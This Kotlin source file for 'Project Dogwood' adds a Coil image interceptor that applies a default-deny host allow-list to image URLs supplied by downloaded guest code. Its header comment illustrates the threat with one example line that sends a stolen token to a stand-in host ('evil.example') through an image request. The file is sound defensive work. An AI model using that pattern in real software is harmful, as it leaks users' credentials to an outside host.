/*
 * Project Dogwood -- the other way out of the sandbox.
 *
 * `DogwoodNetwork` is the guest's only route off the device, and it is a policy point: it
 * default-denies, opts into cleartext per host, caps bodies, and now re-checks every redirect. All
 * of that exists because the payload is downloaded and replaceable over the air without a store
 * review, so an open network service would be an exfiltration channel with the application's name
 * on it.
 *
 * And none of it applied to images. `AsyncImage(url)` handed a guest-supplied string straight to
 * Coil, which fetched it with the singleton loader and no rule whatsoever. A guest wanting to
 * exfiltrate did not need `fetch` at all:
 *
 *     AsyncImage(url = "https://evil.example/collect?token=" + stolen)
 *
 * The image never has to load. Making the *request* is the leak, and the response is not even
 * interesting. This was true on Android from the moment images landed and was extended to iOS
 * without comment.
 *
 * **Images get their own rule rather than sharing the data one**, and that is the decision worth
 * arguing. The threat is identical -- a guest-chosen URL reaching a guest-chosen host -- but the
 * legitimate traffic is not: product images usually live on a content delivery network that has no
 * business answering data requests, and forcing one list would push hosts to widen the data policy
 * to accommodate pictures. So there are two lists, and the image one **defaults to the data one**,
 * which means a host that configures nothing inherits default-deny rather than an accidental hole.
 */
package dev.dogwood.host

import coil3.intercept.Interceptor
import coil3.request.ErrorResult
import coil3.request.ImageResult

/**
 * Refuses image requests the host has not allowed, before any connection is opened.
 *
 * An interceptor rather than a check at the call site: `AsyncImage` is one of several ways an image
 * request can reach Coil, and a rule enforced per call site is a rule somebody adds a call site
 * around. This one sits under all of them.
 *
 * @param allow given the model as the guest supplied it. Returning false short-circuits the chain
 *   without calling `proceed`, so nothing is fetched.
 * @param onRefused every refusal, for the skew report. A silently dropped image is a blank space
 *   nobody can explain.
 */
class ImagePolicyInterceptor(
  private val allow: (String) -> Boolean,
  private val onRefused: (String) -> Unit = {},
) : Interceptor {

  override suspend fun intercept(chain: Interceptor.Chain): ImageResult {
    val verdict = imageVerdict(chain.request.data, allow)
    if (verdict == null) return chain.proceed()
    onRefused(verdict)
    return ErrorResult(image = null, request = chain.request, throwable = ImageRefused(verdict))
  }
}

/**
 * The decision, separated from Coil's object graph so it can be tested exhaustively.
 *
 * Returns the refused URL, or null to proceed. Kept apart because faking `Interceptor.Chain`,
 * `ImageRequest` and `Image` well enough to exercise the adapter buys coverage of Coil's types
 * rather than of this rule -- and the rule is the part that decides whether a guest can reach a
 * host it chose.
 *
 * Anything that is not an http(s) string never left the host: a drawable resource, a byte array, a
 * file the host itself picked. The policy governs what the *guest* can reach, not what the host can
 * draw, so those proceed untouched.
 */
internal fun imageVerdict(model: Any?, allow: (String) -> Boolean): String? {
  val url = model as? String ?: return null
  if (!url.startsWith("http://", ignoreCase = true) &&
    !url.startsWith("https://", ignoreCase = true)
  ) {
    return null
  }
  return if (allow(url)) null else url
}

/** Thrown into Coil's error path so a refusal is distinguishable from a network failure. */
class ImageRefused(url: String) :
  Exception("this client does not allow image requests to $url")

/**
 * The common image rule: these hosts, over Hypertext Transfer Protocol Secure (HTTPS) only.
 *
 * Deliberately the same shape as [allowHosts] so a host configuring both does not have to learn two
 * idioms, and deliberately a *separate call* so that allowing a content delivery network for
 * pictures does not also allow it to answer data requests.
 */
fun allowImageHosts(
  vararg hosts: String,
  allowCleartextHosts: Set<String> = emptySet(),
): (String) -> Boolean {
  val permitted = hosts.toSet()
  return { url ->
    val withoutScheme = url.substringAfter("://", missingDelimiterValue = "")
    val host = withoutScheme.substringBefore('/').substringBefore(':').lowercase()
    val https = url.startsWith("https://", ignoreCase = true)
    val http = url.startsWith("http://", ignoreCase = true)
    host in permitted && (https || (http && host in allowCleartextHosts))
  }
}

/**
 * Builds an [coil3.ImageLoader] that enforces [allow] on every guest-supplied image URL.
 *
 * A host installs this once, typically through Coil's singleton factory, and every `AsyncImage`
 * below it inherits the rule. Provided as a builder rather than a finished loader so a product can
 * keep whatever caching, decoders and network engine it already configured -- the policy is one
 * component in a registry, not a replacement for the loader.
 *
 * **A host that does not install one keeps Coil's default loader and therefore no policy at all.**
 * That is stated rather than defended: enforcing it would mean owning the application's image stack,
 * which Dogwood has no business doing. What Dogwood owes is that the seam exists, that the default
 * rule refuses everything, and that the samples show it wired -- see `slice-android`.
 */
fun coil3.ImageLoader.Builder.withDogwoodImagePolicy(
  allow: (String) -> Boolean,
  onRefused: (String) -> Unit = {},
): coil3.ImageLoader.Builder = components {
  add(ImagePolicyInterceptor(allow, onRefused))
}
